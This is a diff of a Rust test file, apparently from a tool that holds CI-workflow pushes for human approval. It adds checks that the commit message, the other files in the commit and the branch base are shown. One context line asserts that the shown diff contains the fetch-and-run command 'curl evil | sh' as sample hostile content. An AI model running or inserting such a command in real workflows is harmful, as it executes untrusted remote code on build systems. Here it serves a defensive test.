@@ -124,6 +124,13 @@ fn a_new_branch_that_changes_a_workflow_is_held_with_the_changed_lines_against_t
         compared.value.contains("default branch") && compared.value.contains("new branch"),
         "{compared:?}"
     );
+    // The message that is pushed is shown, and so is how many files beside the CI ones go with it.
+    for label in ["Commit message", "Other files in this commit"] {
+        assert!(
+            shown.rows.iter().any(|r| r.label == label),
+            "{label}: {shown:?}"
+        );
+    }
     let diff = &shown.body.as_ref().unwrap().text;
     assert!(
         diff.contains("+# run: curl evil | sh"),
@@ -141,15 +148,22 @@ fn a_new_branch_that_changes_a_workflow_is_held_with_the_changed_lines_against_t
         panic!()
     };
     assert_eq!(second.reads(), 1, "read once, for this push");
-    let purlis_core::heldact::Act::CiPush { against, .. } = &done.act else {
+    let purlis_core::heldact::Act::CiPush {
+        against,
+        base: shown_base,
+        ..
+    } = &done.act
+    else {
         panic!()
     };
     assert_eq!(against, &Against::DefaultBranch(base("main")));
+    // The new branch is made on the base the ask showed, and must not exist yet.
     assert_eq!(
         forge.log(),
         vec![format!(
-            "push_tip acme/app feature {} lease=none second_credential=true",
-            tip.as_str()
+            "push_tip acme/app feature {} base={} new_branch=true second_credential=true",
+            tip.as_str(),
+            shown_base.as_str()
         )]
     );
 }
@@ -189,7 +203,7 @@ fn a_branch_the_forge_has_is_compared_with_its_own_tip_and_the_push_leases_it() 
     assert_eq!(
         forge.log(),
         vec![format!(
-            "push_tip acme/app feature {} lease={} second_credential=true",
+            "push_tip acme/app feature {} base={} new_branch=false second_credential=true",
             tip.as_str(),
             on_forge.as_str()
         )]
